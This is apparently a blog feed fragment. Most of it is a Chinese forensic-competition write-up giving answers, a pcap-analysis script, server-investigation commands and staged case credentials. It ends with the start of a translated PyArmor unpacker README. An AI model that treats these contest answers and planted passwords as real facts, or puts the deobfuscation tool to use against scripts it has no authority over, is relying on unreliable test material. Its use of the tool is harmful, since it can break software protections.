class="keyword">from</span> scapy.layers.http <span class="keyword">import</span> HTTP</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    HTTP = <span class="literal">None</span>  <span class="comment"># HTTP 层可能不在所有版本中提供</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> scapy.layers.dns <span class="keyword">import</span> DNS</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    DNS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">PROTOCOL_MAP = &#123;</span><br><span class="line">    <span class="string">&quot;TCP&quot;</span>: TCP,</span><br><span class="line">    <span class="string">&quot;UDP&quot;</span>: UDP,</span><br><span class="line">    <span class="string">&quot;ICMP&quot;</span>: ICMP,</span><br><span class="line">    <span class="string">&quot;IP&quot;</span>: IP,</span><br><span class="line">    <span class="string">&quot;IPv6&quot;</span>: IPv6,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> HTTP <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    PROTOCOL_MAP[<span class="string">&quot;HTTP&quot;</span>] = HTTP</span><br><span class="line"><span class="keyword">if</span> DNS <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    PROTOCOL_MAP[<span class="string">&quot;DNS&quot;</span>] = DNS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">match_protocol</span>(<span class="params">pkt: Packet, proto_name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proto_name:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    name = proto_name.upper()</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> (<span class="string">&quot;ANY&quot;</span>, <span class="string">&quot;ALL&quot;</span>, <span class="string">&quot;*&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># IP: 同时匹配 IPv4 与 IPv6</span></span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;IP&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> pkt.haslayer(IP) <span class="keyword">or</span> pkt.haslayer(IPv6)</span><br><span class="line">    <span class="comment"># IPv4 别名仅匹配 IPv4</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> (<span class="string">&quot;IPV4&quot;</span>, <span class="string">&quot;IP4&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> pkt.haslayer(IP)</span><br><span class="line">    <span class="comment"># IPv6 仅匹配 IPv6</span></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> (<span class="string">&quot;IPV6&quot;</span>, <span class="string">&quot;IP6&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> pkt.haslayer(IPv6)</span><br><span class="line">    layer = PROTOCOL_MAP.get(name)</span><br><span class="line">    <span class="keyword">if</span> layer <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> pkt.haslayer(layer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">match_address</span>(<span class="params">pkt: Packet, addr: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> addr:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 既支持 IPv4 又支持 IPv6</span></span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(IP):</span><br><span class="line">        ip = pkt[IP]</span><br><span class="line">        <span class="keyword">return</span> ip.src == addr <span class="keyword">or</span> ip.dst == addr</span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(IPv6):</span><br><span class="line">        ip6 = pkt[IPv6]</span><br><span class="line">        <span class="keyword">return</span> ip6.src == addr <span class="keyword">or</span> ip6.dst == addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_len</span>(<span class="params">pkt: Packet</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">bytes</span>(pkt))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># 回退：若无法序列化，尝试最外层 len</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(pkt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_detect_addr_family</span>(<span class="params">addr: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> addr:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> addr:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ipv6&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> addr:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ipv4&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_ratio</span>(<span class="params">pcap_path: <span class="built_in">str</span>, proto_name: <span class="built_in">str</span>, addr: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    packets = rdpcap(pcap_path)</span><br><span class="line">    family = _detect_addr_family(addr)</span><br><span class="line">    total_pkts = <span class="number">0</span></span><br><span class="line">    matched_pkts = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> packets:</span><br><span class="line">        <span class="comment"># 如果提供了地址，则仅统计对应地址族的 IP 包；否则统计 IPv4+IPv6</span></span><br><span class="line">        <span class="keyword">if</span> family == <span class="string">&quot;ipv4&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pkt.haslayer(IP):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> family == <span class="string">&quot;ipv6&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pkt.haslayer(IPv6):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (pkt.haslayer(IP) <span class="keyword">or</span> pkt.haslayer(IPv6)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        total_pkts += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> match_protocol(pkt, proto_name) <span class="keyword">and</span> match_address(pkt, addr):</span><br><span class="line">            matched_pkts += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> total_pkts == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">return</span> matched_pkts / total_pkts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        pcap_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">        proto_name = sys.argv[<span class="number">2</span>]</span><br><span class="line">        addr = sys.argv[<span class="number">3</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">4</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pcap_path = <span class="built_in">input</span>(<span class="string">&quot;请输入 pcap 路径: &quot;</span>).strip()</span><br><span class="line">            proto_name = <span class="built_in">input</span>(<span class="string">&quot;请输入协议名（IP/TCP/UDP/ICMP/HTTP/DNS；支持 IPv4/IPV4/IP4/IPv6；ANY/ALL/* 或留空表示不限制；统计口径：若提供地址则按其地址族（IPv4/IPv6）包数占比，否则 IPv4+IPv6）: &quot;</span>).strip()</span><br><span class="line">            addr_in = <span class="built_in">input</span>(<span class="string">&quot;可选地址(IPv4/IPv6，留空则不限制): &quot;</span>).strip()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Usage: python analyze_pcap.py &lt;pcap_path&gt; &lt;protocol&gt; [address]&quot;</span>, file=sys.stderr)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        addr = addr_in <span class="keyword">if</span> addr_in <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    ratio = compute_ratio(pcap_path, proto_name, addr)</span><br><span class="line">    <span class="comment"># 仅输出一个数值，占比，四舍五入 4 位小数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ratio:<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="19-【填空题】分析嫌疑人的电脑，嫌疑人使用的AI换脸软件中，当前调用的onnx（Open-Neural-Network-Exchange，开放神经网络交换）格式的模型文件有几个？（答案格式：1）"><a class="header-anchor" href="#19-【填空题】分析嫌疑人的电脑，嫌疑人使用的AI换脸软件中，当前调用的onnx（Open-Neural-Network-Exchange，开放神经网络交换）格式的模型文件有几个？（答案格式：1）">¶</a>19.【填空题】分析嫌疑人的电脑，嫌疑人使用的AI换脸软件中，当前调用的onnx（Open Neural Network Exchange，开放神经网络交换）格式的模型文件有几个？（答案格式：1）</h3><p>正确答案：<br>5<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-17.png" alt="alt text"></p><h3 id="20-【填空题】分析嫌疑人的电脑，嫌疑人注册登录的数字天堂开发工具的账号是什么？（答案格式：aaa-bbb-ccc）"><a class="header-anchor" href="#20-【填空题】分析嫌疑人的电脑，嫌疑人注册登录的数字天堂开发工具的账号是什么？（答案格式：aaa-bbb-ccc）">¶</a>20.【填空题】分析嫌疑人的电脑，嫌疑人注册登录的数字天堂开发工具的账号是什么？（答案格式：aaa@bbb.ccc）</h3><p>正确答案：<br><a href="mailto:wanggui0411@outlook.com">wanggui0411@outlook.com</a><br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-19.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-18.png" alt="alt text"></p><h3 id="21-【填空题】分析嫌疑人电脑里的APK前端源码，如办案人员需要对该APK进行调证，请问调证值是多少？（答案格式：英文大写）"><a class="header-anchor" href="#21-【填空题】分析嫌疑人电脑里的APK前端源码，如办案人员需要对该APK进行调证，请问调证值是多少？（答案格式：英文大写）">¶</a>21.【填空题】分析嫌疑人电脑里的APK前端源码，如办案人员需要对该APK进行调证，请问调证值是多少？（答案格式：英文大写）</h3><p>正确答案：<br>H5AAA8907<br>分值：2分</p><ul><li>id一般是调证值</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-20.png" alt="alt text"></p><h3 id="24-【填空题】分析嫌疑人电脑里的APK前端源码，该APK中的API调用的API-Server是多少？（答案格式：以实际为准，如http-www-qasz-com-abc-def-）"><a class="header-anchor" href="#24-【填空题】分析嫌疑人电脑里的APK前端源码，该APK中的API调用的API-Server是多少？（答案格式：以实际为准，如http-www-qasz-com-abc-def-）">¶</a>24.【填空题】分析嫌疑人电脑里的APK前端源码，该APK中的API调用的API Server是多少？（答案格式：以实际为准，如<a href="http://www.qasz.com/abc/def/%EF%BC%89">http://www.qasz.com/abc/def/）</a></h3><p>正确答案：<br><a href="http://www.tianxinbobo.com/csapi/uploads/">http://www.tianxinbobo.com/csapi/uploads/</a><br>分值：2分</p><ul><li>everything搜前端，X-ways打开右键“同步搜索”，apiserver，搜到index文件</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-21.png" alt="alt text"></p><ul><li>回虚拟机找</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-22.png" alt="alt text"></p><h2 id="服务器取证"><a class="header-anchor" href="#服务器取证">¶</a>服务器取证</h2><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-23.png" alt="alt text"></p><ul><li>加外网卡操作：<ul><li>虚拟机-设置-加网络适配器</li><li>DHCP要3-254<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-24.png" alt="alt text"></li></ul></li><li>连宝塔：<ul><li>finalshell<ul><li>ip a</li><li>ssh连接服务状态端口查询命令：</li></ul></li></ul></li></ul><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">systemctl status sshd</span><br></pre></td></tr></table></figure><ul><li>bt 14</li></ul><h3 id="2-【填空题】涉案服务器A的ssh的端口号是多少？"><a class="header-anchor" href="#2-【填空题】涉案服务器A的ssh的端口号是多少？">¶</a>2.【填空题】涉案服务器A的ssh的端口号是多少？</h3><p>正确答案：<br>222<br>分值：2分</p><ul><li>ssh连接服务状态端口查询命令：</li></ul><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">systemctl status sshd</span><br></pre></td></tr></table></figure><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-25.png" alt="alt text"></p><ul><li>端口查询命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -tunlp | grep ssh</span><br></pre></td></tr></table></figure><h3 id="3-【填空题】分析服务器镜像A，涉案服务器的ip地址是什么？-答案格式：123-123-123-123）"><a class="header-anchor" href="#3-【填空题】分析服务器镜像A，涉案服务器的ip地址是什么？-答案格式：123-123-123-123）">¶</a>3.【填空题】分析服务器镜像A，涉案服务器的ip地址是什么？(答案格式：123.123.123.123）</h3><p>正确答案：<br>10.0.0.11<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-27.png" alt="alt text"></p><h3 id="5-【填空题】涉案服务器A中mysql的端口号是多少？（答案格式：123）"><a class="header-anchor" href="#5-【填空题】涉案服务器A中mysql的端口号是多少？（答案格式：123）">¶</a>5.【填空题】涉案服务器A中mysql的端口号是多少？（答案格式：123）</h3><p>正确答案：<br>3340<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-26.png" alt="alt text"></p><h4 id="连接mysql"><a class="header-anchor" href="#连接mysql">¶</a>连接mysql</h4><ul><li>宝塔拿到数据库密码：b21829007afcc1a3<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-28.png" alt="alt text"></li><li>navicat<ul><li>ssh要填</li><li>常规填mysql数据</li></ul></li></ul><h3 id="7-【填空题】涉案服务器A中宝塔面板最早保存的第一次登陆时的ip地址和端口号是什么？（答案格式：123-456-789-123-456）"><a class="header-anchor" href="#7-【填空题】涉案服务器A中宝塔面板最早保存的第一次登陆时的ip地址和端口号是什么？（答案格式：123-456-789-123-456）">¶</a>7.【填空题】涉案服务器A中宝塔面板最早保存的第一次登陆时的ip地址和端口号是什么？（答案格式：123.456.789.123:456）</h3><p>正确答案：<br>192.168.136.1:60332<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-29.png" alt="alt text"></p><h3 id="8-【填空题】涉案服务器A前端登录网址是什么？（答案格式：http-xxx-xxx-xxx-xxx-…）"><a class="header-anchor" href="#8-【填空题】涉案服务器A前端登录网址是什么？（答案格式：http-xxx-xxx-xxx-xxx-…）">¶</a>8.【填空题】涉案服务器A前端登录网址是什么？（答案格式：<a href="http://xxx.xxx.xxx.xxx/../">http://xxx.xxx.xxx.xxx/../</a>…）</h3><p>正确答案：<br><a href="http://10.0.0.11/mobile/login.html">http://10.0.0.11/mobile/login.html</a><br>分值：2分</p><ul><li>域名打不开在host加一条？？？【待】</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-30.png" alt="alt text"></p><h3 id="9-【填空题】涉案服务器A平台共成功充值了多少金额？（答案格式：12340-56）"><a class="header-anchor" href="#9-【填空题】涉案服务器A平台共成功充值了多少金额？（答案格式：12340-56）">¶</a>9.【填空题】涉案服务器A平台共成功充值了多少金额？（答案格式：12340.56）</h3><p>正确答案：<br>30920984.57<br>分值：2分</p><ul><li>这⾥筛选注意，⼀个是系统充值和银⾏⼊款，还有要注意status，应该为1</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-32.png" alt="alt text"></p><h3 id="10-【填空题】根据涉案服务器A回答，肖一帆一共发展了多少个用户作为直接下线？（答案格式：123）"><a class="header-anchor" href="#10-【填空题】根据涉案服务器A回答，肖一帆一共发展了多少个用户作为直接下线？（答案格式：123）">¶</a>10.【填空题】根据涉案服务器A回答，肖一帆一共发展了多少个用户作为直接下线？（答案格式：123）</h3><p>正确答案：<br>7<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-33.png" alt="alt text"></p><h3 id="11-【填空题】根据涉案服务器A中VIP6等级的积分限制是多少？（答案格式：123）"><a class="header-anchor" href="#11-【填空题】根据涉案服务器A中VIP6等级的积分限制是多少？（答案格式：123）">¶</a>11.【填空题】根据涉案服务器A中VIP6等级的积分限制是多少？（答案格式：123）</h3><p>正确答案：<br>1000000<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-34.png" alt="alt text"></p><h3 id="15-【填空题】根据涉案服务器A分析阿里云接口API的银行卡接口地址是多少？（答案格式：以实际为准）【待】"><a class="header-anchor" href="#15-【填空题】根据涉案服务器A分析阿里云接口API的银行卡接口地址是多少？（答案格式：以实际为准）【待】">¶</a>15.【填空题】根据涉案服务器A分析阿里云接口API的银行卡接口地址是多少？（答案格式：以实际为准）【待】</h3><p>正确答案：<br><a href="https://market.aliyun.com/products/56928004/cmapi012976.html">https://market.aliyun.com/products/56928004/cmapi012976.html</a><br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-35.png" alt="alt text"></p><h3 id="16-【填空题】分析嫌疑人的云服务器B，涉案服务器中Java网站源码jar包名称是？（答案格式：包含后缀）"><a class="header-anchor" href="#16-【填空题】分析嫌疑人的云服务器B，涉案服务器中Java网站源码jar包名称是？（答案格式：包含后缀）">¶</a>16.【填空题】分析嫌疑人的云服务器B，涉案服务器中Java网站源码jar包名称是？（答案格式：包含后缀）</h3><p>正确答案：<br>bh-wms-0.0.1-SNAPSHOT.jar<br>分值：2分</p><ul><li>服务器B输入<code>find / -name *.jar</code>，找不到可以把输出结果变成文档<code>find / -name *.jar &gt; jar.txt</code>，最后找到<code>/project/bh-wms-0.0.1-SNAPSHOT.jar</code></li></ul><h3 id="17-【填空题】分析嫌疑人的云服务器B，涉案Java网站数据库root账号的密码是多少？（答案格式：Abc-123456）"><a class="header-anchor" href="#17-【填空题】分析嫌疑人的云服务器B，涉案Java网站数据库root账号的密码是多少？（答案格式：Abc-123456）">¶</a>17.【填空题】分析嫌疑人的云服务器B，涉案Java网站数据库root账号的密码是多少？（答案格式：Abc@123456）</h3><p>正确答案：<br>Tuojie@666<br>分值：2分</p><ul><li>16题文件恢复出来放jadx</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-37.png" alt="alt text"></p><h3 id="18-【填空题】分析嫌疑人的云服务器B，涉案Java网站的端口是多少？（答案示例：3123）"><a class="header-anchor" href="#18-【填空题】分析嫌疑人的云服务器B，涉案Java网站的端口是多少？（答案示例：3123）">¶</a>18.【填空题】分析嫌疑人的云服务器B，涉案Java网站的端口是多少？（答案示例：3123）</h3><p>正确答案：<br>8080<br>分值：2分</p><ul><li><code>java -jar bh-wms-0.0.1-SNAPSHOT.jar</code>，finalshell连接<code>ss -tunlp</code>多出来一个8080端口</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-38.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-39.png" alt="alt text"></p><h3 id="19-【填空题】分析嫌疑人的云服务器B，该网站后台保留的登录账号的用户昵称为？（答案格式：老李）"><a class="header-anchor" href="#19-【填空题】分析嫌疑人的云服务器B，该网站后台保留的登录账号的用户昵称为？（答案格式：老李）">¶</a>19.【填空题】分析嫌疑人的云服务器B，该网站后台保留的登录账号的用户昵称为？（答案格式：老李）</h3><p>正确答案：<br>三弟<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-40.png" alt="alt text"></p><h3 id="20-【填空题】分析嫌疑人的云服务器B，位于南京市江宁区的货物仓库存有多少个产品？（答案格式：123）"><a class="header-anchor" href="#20-【填空题】分析嫌疑人的云服务器B，位于南京市江宁区的货物仓库存有多少个产品？（答案格式：123）">¶</a>20.【填空题】分析嫌疑人的云服务器B，位于南京市江宁区的货物仓库存有多少个产品？（答案格式：123）</h3><p>正确答案：<br>21626<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-41.png" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2025/10/21/%E6%B5%8B%E8%AF%95/"/>
      <url>/2025/10/21/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="内容认证失败，但仍可尝试查看。">  <script id="hbeData" type="hbeData" data-hmacdigest="b91d13af6d1b68bbf6bfc5ed7033eef0466d1dc4ab5926cde5912c99ec97ac0a">9e78b6d631bab6ce2a3bb06937563e523dbdb9b1c92e06ae55c9733ca8b87422251ac405fe582a39a745b60232f650c615211351a91b2028b126f842b34b405618d6f9c60d7918aa3fec0513d890ec054db8a23e251a3fbebc9cff0e7ce87a4d7a22bd919e20937fde36343a66f1bd4d1dddfd97b409913f86193b996b0376503e3e8a9b21a1ead7a6f2773161e1db618b286fb10183ef25996c874f917de25216b52bad84182c0cdb93ba49f504052dabfeb9e0001302b37c91828f44f917d90b3d0d09ccfa2c9f39ec0f52087832a40b90984c058dd90ef42ac95259fd6de7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 加密文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyArmor-Unpacker使用教程</title>
      <link href="/2025/10/21/PyArmor-Unpacker%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2025/10/21/PyArmor-Unpacker%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1>Pyarmor 静态脱壳一键工具readme.md文件翻译</h1><p><a href="https://github.com/dashingsoft/pyarmor">Pyarmor</a> 是一款流行的 Python 源代码保护工具。它将 Python 脚本转换为二进制数据，这些数据可以看作是 pyc 文件的加密变体。它们可以通过一个共享库（pyarmor_runtime）解密，然后由 Python 解释器执行。</p><p>本项目旨在将受保护的（armored）数据转换回字节码汇编，并（实验性地）转换回源代码。我们复刻了优秀的 <a href="https://github.com/zrax/pycdc">Decompyle++</a>（又名 pycdc），并在其基础上添加了一些处理流程，例如修改抽象语法树。</p><blockquote><p>[!IMPORTANT]</p><p>此工具仅应用于您拥有或已获授权分析的脚本。请尊重软件许可证和服务条款。作者不对因使用此工具造成的任何误用或损害负责。</p></blockquote><blockquote><p>[!NOTE]</p><p>与其他反编译器一样，此工具面向专业用户。您应对 Python 字节码有基本的了解。如果不是，您可能需要向了解的人寻求帮助。</p></blockquote><blockquote><p>[!WARNING]</p><p><strong>反汇编结果是准确的，但反编译的代码可能不完整或不正确。</strong> <a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/issues/3">参见 issue #3</a></p></blockquote><h2 id="特性"><a class="header-anchor" href="#特性">¶</a>特性</h2><h3 id="静态分析"><a class="header-anchor" href="#静态分析">¶</a>静态分析</h3><p>您无需执行加密的脚本。我们使用与 pyarmor_runtime 相同的算法来解密它们。这在脚本不可信时非常有用。</p><h3 id="通用性强"><a class="header-anchor" href="#通用性强">¶</a>通用性强</h3><p>目前我们正尝试支持 Pyarmor 8.0 到 9.1.x（最新版），Python 3.7 到 3.13，在所有操作系统上，并尽可能支持多种混淆选项。（然而，我们的测试有限。）</p><blockquote><p>[!NOTE]</p><p>如果数据以 <code>PY</code> 开头，后跟六位数字，则受支持。否则，如果它以 <code>PYARMOR</code> 开头，则是由 Pyarmor 7 或更早版本生成的，不受支持。</p></blockquote><h3 id="易于使用"><a class="header-anchor" href="#易于使用">¶</a>易于使用</h3><p>您唯一需要做的是指定您混淆脚本的位置。该工具将完成所有工作，如检测受保护数据、解析、反汇编和反编译。请参阅下面的&quot;使用方法&quot;部分。</p><h2 id="构建"><a class="header-anchor" href="#构建">¶</a>构建</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ../pycdc</span><br><span class="line">cmake --build .</span><br><span class="line">cmake --install .</span><br></pre></td></tr></table></figure><p>您也可以在<a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases">发布页面</a>下载预编译的二进制文件。</p><h3 id="使用方法"><a class="header-anchor" href="#使用方法">¶</a>使用方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python /path/to/oneshot/shot.py /path/to/scripts</span><br></pre></td></tr></table></figure><p>在运行 <a href="http://shot.py">shot.py</a> 之前，请确保 oneshot 目录中存在可执行文件 pyarmor-1shot（在 Windows 上是 pyarmor-1shot.exe）。</p><p>您只需要指定包含所有受保护数据和 pyarmor_runtime 的目录。该工具会尽可能地递归查找和处理它们。</p><p>必要时，可以使用 -r 